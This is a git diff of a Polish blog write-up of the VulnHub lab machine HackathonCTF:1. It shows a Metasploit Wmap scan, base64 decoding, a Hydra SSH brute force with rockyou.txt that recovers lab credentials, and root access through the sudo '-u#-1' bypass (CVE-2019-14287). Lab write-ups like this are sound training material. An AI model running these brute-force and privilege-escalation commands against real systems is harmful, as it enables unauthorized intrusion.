@@ -14,21 +14,21 @@ header:
   overlay_image: /assets/images/pasek-hack.png
 ---
 # Metainfo
-
+| | |
 |:----|:----|
-|Nazwa|HackathonCTF: 1|
-|Autor|[Somu-sen](https://www.vulnhub.com/author/somu-sen,747/)|
-|Wypuszczony|27.10.2020|
-|Link|[Tutaj](https://www.vulnhub.com/entry/hackathonctf-1,591/)|
-|Dostępny na|[Vulnhub](https://www.vulnhub.com)|
-|Poziom|Łatwy|
-|Nauczysz się|Metasploit, ASCII code, BASE64, SUDO|
+|Nazwa:|HackathonCTF: 1|
+|Autor:|[Somu-sen](https://www.vulnhub.com/author/somu-sen,747/)|
+|Wypuszczony:|27.10.2020|
+|Link:|[Tutaj](https://www.vulnhub.com/entry/hackathonctf-1,591/)|
+|Dostępny na:|[Vulnhub](https://www.vulnhub.com)|
+|Poziom:|Łatwy|
+|Nauczysz się:|Metasploit, ASCII, BASE64, SUDO|
 
 # Wstęp
-HackathonCTF:1 został stworzony (jak i dużo innych ciekawych obrazów) przez [Somu Sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie **root**a (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na **Ubuntu 14.04**, więc ja na swoim **XPC-NG** nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
+**HackathonCTF:1** został stworzony (jak i dużo innych ciekawych obrazów) przez [Somu Sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie **root**a (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na **Ubuntu 14.04**, więc ja na swoim **XPC-NG** nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
 {: .text-justify}
 ## Moduły w Metasploicie
-Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa z niego modułów. Na tapetę, do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron ***WWW***. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej jest screen z komend, które wydałem:
+Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa z niego modułów. Na tapetę, do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron **WWW**. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej jest screen z komend, które wydałem:
 {: .text-justify}
 ```bash
 msf6 > load wmap
@@ -390,16 +390,13 @@ Został nam do rozkodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który j
 {: .text-justify}
 ```bash
 # echo -n c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg== | base64 -d
+ssh-bruteforce-sudoit
 ```
-Po rozkodowaniu otrzymujemy **ssh-bruteforce-sudoit**. Żeby się dostać na serwer ssh, posłużymy się metodą siłową, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się **Hydra**. Przyznam, że na początku zmyliło mnie te początkowe **se** w **se rockyou.txt**. Stworzyłem plik ze słowami zaczynającymi się od **se**, jednak nic to nie dało. Więc zacząłem skanowanie całego pliku **rockyou.txt**. Na szczęście nie trwało to długo, zwłaszcza, że w parametrach **Hydry** ustawiłem więcej wątków niż jest przewidziane standardowo. Skanowanie **SSH** skończyło się dosyć szybko.
+Żeby się dostać na serwer **SSH**, posłużymy się metodą siłową, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się **Hydra**. Przyznam, że na początku zmyliło mnie te początkowe **se** w **se rockyou.txt**. Stworzyłem plik ze słowami zaczynającymi się od **se**, jednak nic to nie dało. Więc zacząłem skanowanie całego pliku **rockyou.txt**. Na szczęście nie trwało to długo, zwłaszcza, że w parametrach **Hydry** ustawiłem więcej wątków niż jest przewidziane standardowo. Skanowanie **SSH** skończyło się dosyć szybko.
 {: .text-justify}
 ```bash
 # hydra -t 64 -l test -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.167:7223 -V -I -f
-```
-```console
 [7223][ssh] host: 172.16.1.167   login: test   password: jordan23
-```
-```bash
 # ssh test@172.16.1.167 -p 7223
 ```
 ## Mamy Shella
@@ -407,8 +404,6 @@ Mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem
 {: .text-justify}
 ```bash
 # history
-```
-```console
 99  cat pass.txt
 100  nano pass.txt
 167  sudo -u#-1 /bin/bash
@@ -423,7 +418,6 @@ Matching Defaults entries for test on ctf:
 
 User test may run the following commands on ctf:
     (ALL, !root) ALL
-test@ctf:~$
 ```
 **(ALL, !root) ALL** - to jest ciekawe.
 ## Podatność CVE 2019-14287
@@ -433,16 +427,14 @@ test@ctf:~$
 Ta komenda daje dostęp do **root**a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoli, jeszcze widzimy plik **pass.txt**. Mając **root**a szybko coś znajdziemy.
 {: .text-justify}
 ```bash
-root@ctf:~# find / -name pass.txt
+# root@ctf:~# find / -name pass.txt
 /media/floppy0/media/imp/pass.txt
-root@ctf:~#
 ```
 Dekodujemy:
 {: .text-justify}
 ```bash
-test@ctf:~$ echo Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo= | base64 -d
+# test@ctf:~$ echo Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo= | base64 -d
 CTFdfrGHYjUsSsKK@12345
-test@ctf:~$
 ```
 Jest hasło, ale nie wiadomo do czego. ;) Potem się okazało, że się przydało do pliku /var/zip.rar. W pliku nic nie było.
 {: .text-justify}
